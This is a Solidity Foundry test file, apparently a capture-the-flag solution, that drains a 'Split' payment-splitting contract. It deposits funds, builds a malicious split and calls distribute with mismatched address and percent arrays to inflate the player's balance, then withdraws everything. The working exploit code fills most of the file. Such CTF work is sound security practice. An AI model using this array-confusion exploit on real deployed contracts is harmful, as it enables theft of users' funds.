// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFDeployment.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


import "src/Split.sol";
import "src/Challenge.sol";
import {console2} from "forge-std/console2.sol";

contract Solve is BaseTest {
    Split internal split;
    address[] internal addrs = new address[](2);
    uint32[] internal percents = new uint32[](2);
    function setUp() public override {
        super.setUp();

        vm.startBroadcast(system);

        split = new Split();

        addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[1] = address(0x000000000000000000000000000000000000bEEF);
        percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        uint256 id = split.createSplit(addrs, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 100 ether}();

        challenge = address(new Challenge(split));

        vm.stopBroadcast();
    }

    function testSolve() public {
        Split.SplitData memory splitData = split.splitsById(0);
        console2.log('------------------------- before attack -----------------------------');
        emit log_named_decimal_uint("attacker's wallet balance",address(splitData.wallet).balance, 18);
        emit log_named_decimal_uint("address(SPLIT).balance",address(split).balance,18);
        
        vm.startBroadcast(player);
        console2.log('------------------------- try to attack -----------------------------');
        console2.log(unicode'1. 0号钱包distribute，为了将其deposit的100 eth转给Split合约.');
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(0x00));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        split.distribute(0, addrs, percents,0, IERC20(address(0x00)));
        emit log_named_decimal_uint("balances[player][eth]",split.balances(player, address(0x00)),18);
        emit log_named_decimal_uint("address(SPLIT).balance",address(split).balance, 18);

        // 开个恶意钱包
        console2.log(unicode'2. 构造恶意钱包，并depoit，为后续攻击做准备，考虑split余额来确定deposit多少');
        
        address[] memory addrs_copy = new address[](2);
        addrs_copy[0] = player;
        addrs_copy[1] = address(bytes20(uint160(2e6))); // 能够记账2*100 ether
        uint32[] memory percents_copy = new uint32[](2);
        percents_copy[0] = 9.9 * 1e5;
        percents_copy[1] = 0.1 * 1e5;

        uint256 id = split.createSplit(addrs_copy, percents_copy, 0);

        Split.SplitData memory splitData2 = split.splitsById(id);
        splitData2.wallet.deposit{value: 100 ether}();

        console2.log("attacker wallet id", id);
        emit log_named_decimal_uint("attacker's wallet balance",address(splitData2.wallet).balance, 18);
        emit log_named_decimal_uint("address(SPLIT).balance",address(split).balance,18);

        console2.log(unicode'3. 将假地址转换成percents变量，进行distribute.');
        address[] memory playerAccount = new address[](1);
        playerAccount[0] = address(player);
        uint32[] memory playerPercent = new uint32[](3);
        playerPercent[0] = 2e6;
        playerPercent[1] = 9.9 * 1e5;
        playerPercent[2] = 0.1 * 1e5;

        split.distribute(id, playerAccount, playerPercent, 0, IERC20(address(0x00)));

        emit log_named_decimal_uint("address(splitData.wallet).balance",address(splitData2.wallet).balance, 18);
        emit log_named_decimal_uint("address(SPLIT).balance",address(split).balance,18);

        console2.log(unicode'4. 进行withdraw操作.');
        IERC20[] memory withdraws = new IERC20[](1);
        uint256[] memory bals = new uint[](1);
        withdraws[0] = IERC20(address(0x00));
        bals[0] = split.balances(player, address(0x00));

        split.withdraw(withdraws, bals);


        vm.stopBroadcast();

        console2.log('------------------------- after attack -----------------------------');
        emit log_named_decimal_uint("attacker's wallet balance",address(splitData.wallet).balance, 18);
        emit log_named_decimal_uint("address(SPLIT).balance",address(split).balance,18);
        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
    /* function isSolved() external view returns (bool) {
        Split.SplitData memory splitData = SPLIT.splitsById(0);

        return address(SPLIT).balance == 0 && address(splitData.wallet).balance == 0;
    } */
}